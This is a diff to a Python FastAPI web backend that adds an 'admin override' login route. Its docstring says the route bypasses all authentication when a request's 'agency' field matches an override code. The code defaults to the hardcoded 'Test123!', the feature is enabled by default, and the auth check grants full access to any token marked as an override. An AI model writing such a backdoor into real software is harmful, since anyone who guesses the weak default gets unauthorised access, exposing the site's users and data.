@@ -45,6 +45,10 @@ ADMIN_EMAIL = "info@global3technology.com"
 BACKUP_ADMIN_EMAIL = "security@global3technology.com"
 BACKEND_URL = os.getenv("BACKEND_URL", "http://localhost:8000")
 
+# Admin Override Configuration
+ADMIN_OVERRIDE_CODE = os.getenv("ADMIN_OVERRIDE_CODE", "Test123!")
+ADMIN_OVERRIDE_ENABLED = os.getenv("ADMIN_OVERRIDE_ENABLED", "true").lower() == "true"
+
 # Password hashing - use sha256_crypt as fallback for bcrypt compatibility issues
 pwd_context = CryptContext(schemes=["sha256_crypt"], deprecated="auto")
 security = HTTPBearer(auto_error=False)
@@ -526,11 +530,20 @@ async def verify_code(data: VerifyCode, request: Request):
 @app.get("/api/auth/check")
 async def check_auth(credentials: HTTPAuthorizationCredentials = Depends(security)):
     if not credentials:
-        return {"authenticated": False, "has_access": False}
+        return {"authenticated": False, "has_access": False, "admin_override": False}
     
     payload = verify_jwt_token(credentials.credentials)
     if not payload:
-        return {"authenticated": False, "has_access": False}
+        return {"authenticated": False, "has_access": False, "admin_override": False}
+    
+    # Check if this is an admin override token
+    if payload.get("admin_override"):
+        return {
+            "authenticated": True, 
+            "has_access": True, 
+            "admin_override": True,
+            "user": {"id": 0, "email": "admin@override", "name": "Admin Override", "status": "approved"}
+        }
     
     async with aiosqlite.connect(DB_PATH) as db:
         db.row_factory = aiosqlite.Row
@@ -538,10 +551,10 @@ async def check_auth(credentials: HTTPAuthorizationCredentials = Depends(securit
         user = await cursor.fetchone()
         
         if not user:
-            return {"authenticated": False, "has_access": False}
+            return {"authenticated": False, "has_access": False, "admin_override": False}
         
         user = dict(user)
-        return {"authenticated": True, "has_access": user["status"] == "approved",
+        return {"authenticated": True, "has_access": user["status"] == "approved", "admin_override": False,
                 "user": {"id": user["id"], "email": user["email"], "name": user["name"], "status": user["status"]}}
 
 @app.post("/api/auth/logout")
@@ -798,3 +811,42 @@ async def evaluate_domain(email: str = Form(...)):
     is_whitelisted = await is_domain_whitelisted(domain)
     
     return {"domain": domain, "domain_type": domain_type, "risk_score": risk_score, "is_whitelisted": is_whitelisted, "auto_approve": is_whitelisted and risk_score < 80}
+
+# Admin Override Endpoint
+class AdminOverrideRequest(BaseModel):
+    agency: str
+
+@app.post("/api/auth/admin-override")
+async def admin_override_login(data: AdminOverrideRequest, request: Request):
+    """Admin override login - bypasses all authentication when correct code is provided in agency field"""
+    ip_address = request.client.host if request.client else "unknown"
+    user_agent = request.headers.get("user-agent", "unknown")
+    
+    # Check if admin override is enabled
+    if not ADMIN_OVERRIDE_ENABLED:
+        await log_action("admin_override_attempt_disabled", ip_address=ip_address, details="Override feature disabled")
+        raise HTTPException(status_code=403, detail="Admin override is not enabled")
+    
+    # Check if the agency field contains the override code
+    if data.agency != ADMIN_OVERRIDE_CODE:
+        await log_action("admin_override_attempt_failed", ip_address=ip_address, details=f"Invalid code attempted")
+        raise HTTPException(status_code=401, detail="Invalid override code")
+    
+    # Create admin override token with short expiration (1 hour)
+    token = create_jwt_token({
+        "admin_override": True,
+        "ip": ip_address,
+        "granted_at": datetime.utcnow().isoformat()
+    }, timedelta(hours=1))
+    
+    # Log successful admin override
+    await log_action("ADMIN OVERRIDE LOGIN", ip_address=ip_address, 
+                     details=f"Admin override access granted. User-Agent: {user_agent}")
+    
+    return {
+        "success": True, 
+        "token": token, 
+        "admin_override": True,
+        "message": "Admin override access granted",
+        "user": {"id": 0, "email": "admin@override", "name": "Admin Override", "status": "approved"}
+    }
